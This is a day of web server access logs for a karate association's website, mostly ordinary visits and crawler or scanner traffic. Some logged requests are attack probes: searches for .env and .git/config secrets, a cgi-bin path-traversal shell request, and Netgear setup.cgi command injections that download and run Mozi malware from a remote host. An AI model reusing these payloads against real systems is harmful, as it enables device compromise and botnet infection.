::ffff:99.92.93.12 - - [28/Feb/2023:00:09:33 +0000] "GET / HTTP/1.1" - - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/zoomdonkaratedo.jpg HTTP/1.1" 200 32454 "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:43 +0000] "GET /images/schools/zoomsfbakaratedo.jpg HTTP/1.1" 200 259024 "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:44 +0000] "GET /images/schools/martinezkaratedo.jpg HTTP/1.1" 200 1754187 "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:81.241.18.246 - - [28/Feb/2023:17:29:45 +0000] "GET /images/schools/manzanitakaratedo.jpg HTTP/1.1" 200 1829058 "http://wadokikai.org/schools" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:128.199.21.228 - - [28/Feb/2023:17:36:18 +0000] "GET / HTTP/1.0" 200 57378 "-" "-"
::ffff:167.94.138.47 - - [28/Feb/2023:17:37:46 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.47 - - [28/Feb/2023:17:37:56 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.138.47 - - [28/Feb/2023:17:37:56 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.138.47 - - [28/Feb/2023:17:37:56 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:43.155.118.219 - - [28/Feb/2023:17:51:38 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:95.214.235.205 - - [28/Feb/2023:17:53:21 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [28/Feb/2023:17:53:21 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:179.43.154.247 - - [28/Feb/2023:18:59:38 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.5(0x17000523) NetType/WIFI Language/en"
::ffff:128.14.224.234 - - [28/Feb/2023:19:04:44 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:54.36.112.44 - - [28/Feb/2023:19:05:14 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [28/Feb/2023:19:05:15 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:128.14.224.234 - - [28/Feb/2023:19:05:37 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Go-http-client/1.1"
::ffff:128.14.224.234 - - [28/Feb/2023:19:05:42 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Go-http-client/1.1"
::ffff:128.14.224.234 - - [28/Feb/2023:19:05:46 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
::ffff:128.14.224.234 - - [28/Feb/2023:19:05:52 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Go-http-client/1.1"
::ffff:43.155.118.219 - - [28/Feb/2023:19:11:39 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:94.102.51.9 - - [28/Feb/2023:19:18:46 +0000] "GET /m_login.html HTTP/1.0" 404 151 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:185.254.196.115 - - [28/Feb/2023:19:23:38 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:185.254.196.115 - - [28/Feb/2023:19:23:40 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [28/Feb/2023:19:33:47 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [28/Feb/2023:19:33:47 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:18.202.77.232 - - [28/Feb/2023:19:37:33 +0000] "HEAD / HTTP/1.1" 200 57378 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::ffff:35.185.241.102 - - [28/Feb/2023:19:39:25 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
::ffff:128.1.248.26 - - [28/Feb/2023:19:41:35 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:45.40.57.179 - - [28/Feb/2023:19:42:09 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:45.40.57.179 - - [28/Feb/2023:19:43:38 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Go-http-client/1.1"
::ffff:45.40.57.179 - - [28/Feb/2023:19:43:47 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Go-http-client/1.1"
::ffff:45.40.57.179 - - [28/Feb/2023:19:43:58 +0000] "GET /sitemap.xml HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
::ffff:45.40.57.179 - - [28/Feb/2023:19:44:09 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Go-http-client/1.1"
::ffff:167.94.146.59 - - [28/Feb/2023:19:57:27 +0000] "GET / HTTP/1.1" 200 57378 "-" "-"
::ffff:167.94.146.59 - - [28/Feb/2023:19:57:27 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.146.59 - - [28/Feb/2023:19:57:28 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.146.59 - - [28/Feb/2023:19:57:28 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.146.59 - - [28/Feb/2023:19:57:28 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:18.202.77.232 - - [28/Feb/2023:19:57:36 +0000] "GET / HTTP/1.1" 200 57378 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::ffff:18.202.77.232 - - [28/Feb/2023:20:13:16 +0000] "GET / HTTP/1.1" 200 57378 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::ffff:18.202.77.232 - - [28/Feb/2023:20:28:20 +0000] "GET /index.htm HTTP/1.0" 404 148 "https://www.netcraft.com/survey/" "Mozilla/4.0 (compatible; Netcraft Web Server Survey)"
::ffff:43.155.118.219 - - [28/Feb/2023:20:30:56 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:109.237.97.180 - - [28/Feb/2023:20:32:40 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [28/Feb/2023:20:47:51 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [28/Feb/2023:20:47:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [28/Feb/2023:20:52:45 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [28/Feb/2023:20:52:45 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:45.134.140.161 - - [28/Feb/2023:20:57:54 +0000] "GET /apis/apps/v1/namespaces/kube-system/daemonsets HTTP/1.1" 404 185 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
::ffff:95.214.235.205 - - [28/Feb/2023:21:02:36 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:95.214.235.205 - - [28/Feb/2023:21:02:36 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:172.93.201.243 - - [28/Feb/2023:21:03:37 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:172.93.201.243 - - [28/Feb/2023:21:03:38 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.148.51 - - [28/Feb/2023:21:05:39 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.13 - - [28/Feb/2023:21:05:41 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.8 - - [28/Feb/2023:21:05:43 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.16 - - [28/Feb/2023:21:05:44 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.2 - - [28/Feb/2023:21:05:44 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [28/Feb/2023:21:05:45 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.17 - - [28/Feb/2023:21:05:46 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [28/Feb/2023:21:05:46 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.4 - - [28/Feb/2023:21:05:47 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [28/Feb/2023:21:05:48 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.11 - - [28/Feb/2023:21:05:48 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.6 - - [28/Feb/2023:21:05:49 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.20 - - [28/Feb/2023:21:05:50 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.9 - - [28/Feb/2023:21:05:50 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:51.222.253.7 - - [28/Feb/2023:21:05:51 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:17.241.219.253 - - [28/Feb/2023:21:14:20 +0000] "GET /images/instructors/btimlin.jpg HTTP/1.1" 200 378054 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
::ffff:117.243.205.197 - - [28/Feb/2023:21:17:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:117.243.205.197 - - [28/Feb/2023:21:17:38 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:117.243.205.197 - - [28/Feb/2023:21:17:39 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:139.162.190.203 - - [28/Feb/2023:21:21:14 +0000] "GET / HTTP/1.0" - - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
::ffff:205.210.31.40 - - [28/Feb/2023:21:33:52 +0000] "GET / HTTP/1.1" 200 57378 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:193.32.162.159 - - [28/Feb/2023:21:35:21 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:135.125.244.48 - - [28/Feb/2023:21:42:50 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [28/Feb/2023:21:42:51 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:43.155.118.219 - - [28/Feb/2023:21:50:02 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:182.127.44.58 - - [28/Feb/2023:22:03:31 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.127.44.58:33714/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:162.221.192.26 - - [28/Feb/2023:22:09:57 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:162.214.71.92 - - [28/Feb/2023:22:15:17 +0000] "GET / HTTP/1.1" 200 57378 "-" "curl/7.29.0"
::ffff:185.225.74.55 - - [28/Feb/2023:22:33:35 +0000] "POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1" - - "-" "-"
::ffff:20.12.197.2 - - [28/Feb/2023:22:35:00 +0000] "GET / HTTP/1.1" 200 57378 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:216.131.79.136 - - [28/Feb/2023:22:41:28 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:216.131.79.136 - - [28/Feb/2023:22:41:31 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:110.42.223.150 - - [28/Feb/2023:22:44:29 +0000] "GET http://34.212.47.6:80/phpMyAdmin-2.11.1.2/scripts/setup.php HTTP/1.0" 404 176 "-" "-"
::ffff:110.42.223.150 - - [28/Feb/2023:22:44:29 +0000] "GET http://34.212.47.6:80/mysql-admin/scripts/setup.php HTTP/1.0" 404 168 "-" "-"
::ffff:113.69.129.12 - - [28/Feb/2023:22:55:00 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:43.155.118.219 - - [28/Feb/2023:23:09:10 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 160 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
::ffff:67.188.76.94 - - [28/Feb/2023:23:16:47 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
::ffff:135.125.244.48 - - [28/Feb/2023:23:22:58 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.244.48 - - [28/Feb/2023:23:22:58 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:94.102.51.9 - - [28/Feb/2023:23:29:50 +0000] "GET / HTTP/1.0" 200 57378 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
::ffff:31.170.161.19 - - [28/Feb/2023:23:33:18 +0000] "GET /wordpress/ HTTP/1.1" 404 149 "-" "-"
::ffff:18.237.0.140 - - [28/Feb/2023:23:47:20 +0000] "GET /.well-known/acme-challenge/E8uBr5BoW-67lRAsF7ym1v1fL-rbexr9iZqK9ns0THw HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:3.16.51.235 - - [28/Feb/2023:23:47:20 +0000] "GET /.well-known/acme-challenge/E8uBr5BoW-67lRAsF7ym1v1fL-rbexr9iZqK9ns0THw HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.102 - - [28/Feb/2023:23:47:20 +0000] "GET /.well-known/acme-challenge/E8uBr5BoW-67lRAsF7ym1v1fL-rbexr9iZqK9ns0THw HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:3.16.51.235 - - [28/Feb/2023:23:47:26 +0000] "GET /.well-known/acme-challenge/JpsG8H69_Q9tN9W76lrVrOiv_Qv0B0rclTRPV-SScdA HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:52.36.143.201 - - [28/Feb/2023:23:47:26 +0000] "GET /.well-known/acme-challenge/JpsG8H69_Q9tN9W76lrVrOiv_Qv0B0rclTRPV-SScdA HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:23.178.112.103 - - [28/Feb/2023:23:47:26 +0000] "GET /.well-known/acme-challenge/JpsG8H69_Q9tN9W76lrVrOiv_Qv0B0rclTRPV-SScdA HTTP/1.1" 404 209 "-" "Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org)"
::ffff:213.180.203.106 - - [28/Feb/2023:23:47:46 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
::ffff:95.108.213.162 - - [28/Feb/2023:23:47:47 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; YandexFavicons/1.0; +http://yandex.com/bots)"
::ffff:54.36.112.44 - - [28/Feb/2023:23:49:53 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:54.36.112.44 - - [28/Feb/2023:23:49:54 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
